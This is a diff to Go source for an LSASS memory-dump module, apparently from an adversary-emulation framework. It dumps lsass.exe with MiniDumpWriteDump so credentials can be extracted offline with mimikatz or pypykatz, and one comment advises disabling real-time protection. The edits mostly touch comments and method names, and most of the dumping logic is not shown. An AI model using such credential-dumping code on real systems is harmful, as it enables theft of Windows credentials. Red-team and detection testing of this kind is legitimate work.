@@ -18,20 +18,22 @@ var (
 
 const miniDumpWithFullMemory = 0x00000002
 
-// LSASSDump writes a minidump of lsass.exe to OutputPath using
-// MiniDumpWriteDump.  Parse offline with pypykatz / mimikatz.
+// LSASSDump writes a full minidump of lsass.exe to OutputPath using
+// MiniDumpWriteDump from dbghelp.dll.  Parse offline with pypykatz / mimikatz.
 // MITRE T1003.001.
 //
-// Requires SeDebugPrivilege; set EnableSeDebug=true to enable it
-// programmatically (Administrators hold the privilege).  Modern Defender
-// flags both the on-disk artifact and the syscall pattern - test in a lab.
+// Requires SeDebugPrivilege.  Set EnableSeDebug=true to enable it
+// programmatically (Administrators hold the privilege).
+// Modern Defender flags both the on-disk artefact and the call pattern —
+// use in a lab with real-time protection disabled.
 type LSASSDump struct {
 	OutputPath    string // required: path to write the .dmp
 	EnableSeDebug bool
 }
 
-func (l *LSASSDump) Name() string  { return "lsass-dump" }
-func (l *LSASSDump) MITRE() string { return "T1003.001" }
+func (l *LSASSDump) Name() string    { return "lsass-dump" }
+func (l *LSASSDump) ID() string      { return "T1003.001" }
+func (l *LSASSDump) Rollback() error { return nil }
 
 func (l *LSASSDump) Run() error {
 	if l.OutputPath == "" {
@@ -83,5 +85,5 @@ func (l *LSASSDump) Run() error {
 	return nil
 }
 
-// silence unused import in non-Windows builds
+// silence unused import warning on non-Windows analysis tools
 var _ = unsafe.Sizeof(0)
